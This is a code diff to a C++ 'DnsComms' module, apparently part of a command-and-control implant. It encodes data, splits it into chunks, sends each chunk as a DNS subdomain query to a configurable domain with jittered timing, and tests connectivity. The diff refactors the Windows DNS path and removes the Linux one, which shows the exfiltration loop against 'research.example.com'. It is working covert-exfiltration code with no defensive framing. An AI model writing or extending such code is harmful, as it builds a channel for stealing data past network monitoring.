@@ -8,6 +8,12 @@
 #include <sstream>
 #include <cstdint>
 #include <string>
+#include <winsock2.h>
+#include <windns.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "dnsapi.lib")
 
 DnsComms::DnsComms(Configuration* config)
     : m_config(config), m_dnsServer("8.8.8.8") {}
@@ -17,6 +23,13 @@ DnsComms::~DnsComms() {
 }
 
 bool DnsComms::Initialize() {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        LOG_ERROR("WSAStartup failed");
+        return false;
+    }
+
     // Parse DNS server from configuration if available
     std::string server = m_config->GetValue("dns_server", "8.8.8.8");
     m_dnsServer = server;
@@ -35,15 +48,10 @@ bool DnsComms::SendData(const std::vector<uint8_t>& data) {
         chunks.push_back(encodedData.substr(i, 50));
     }
 
-#if PLATFORM_WINDOWS
-    return SendDataWindows(chunks);
-#elif PLATFORM_LINUX
-    return SendDataLinux(chunks);
-#endif
+    return SendDataInternal(chunks);
 }
 
-bool DnsComms::SendDataWindows(const std::vector<std::string>& chunks) {
-#if PLATFORM_WINDOWS
+bool DnsComms::SendDataInternal(const std::vector<std::string>& chunks) const {
     bool overallSuccess = true;
     
     for (const auto& chunk : chunks) {
@@ -67,48 +75,18 @@ bool DnsComms::SendDataWindows(const std::vector<std::string>& chunks) {
     }
 
     return overallSuccess;
-#else
-    return false;
-#endif
-}
-
-bool DnsComms::SendDataLinux(const std::vector<std::string>& chunks) const {
-#if PLATFORM_LINUX
-    bool overallSuccess = true;
-    
-    for (const auto& chunk : chunks) {
-        std::string query = chunk + "." + m_config->GetValue("dns_domain", "research.example.com");
-        
-        // Use Linux DNS resolution (simplified)
-        struct hostent* host = gethostbyname(query.c_str());
-        if (!host) {
-            LOG_DEBUG("DNS query failed for: " + query);
-            overallSuccess = false;
-        }
-
-        utils::TimeUtils::JitterSleep(100, 0.3);
-    }
-
-    return overallSuccess;
-#else
-    return false;
-#endif
 }
 
 void DnsComms::Cleanup() {
+    WSACleanup();
     LOG_DEBUG("DNS communication cleaned up");
 }
 
 bool DnsComms::TestConnection() const {
-#if PLATFORM_WINDOWS
-    return TestConnectionWindows();
-#elif PLATFORM_LINUX
-    return TestConnectionLinux();
-#endif
+    return TestConnectionInternal();
 }
 
-bool DnsComms::TestConnectionWindows() {
-#if PLATFORM_WINDOWS
+bool DnsComms::TestConnectionInternal() const {
     PDNS_RECORD dnsRecord;
     DNS_STATUS status = DnsQuery_A(
         "google.com",
@@ -125,18 +103,6 @@ bool DnsComms::TestConnectionWindows() {
     }
     
     return false;
-#else
-    return false;
-#endif
-}
-
-bool DnsComms::TestConnectionLinux() {
-#if PLATFORM_LINUX
-    struct hostent* host = gethostbyname("google.com");
-    return host != nullptr;
-#else
-    return false;
-#endif
 }
 
 std::vector<uint8_t> DnsComms::ReceiveData() {
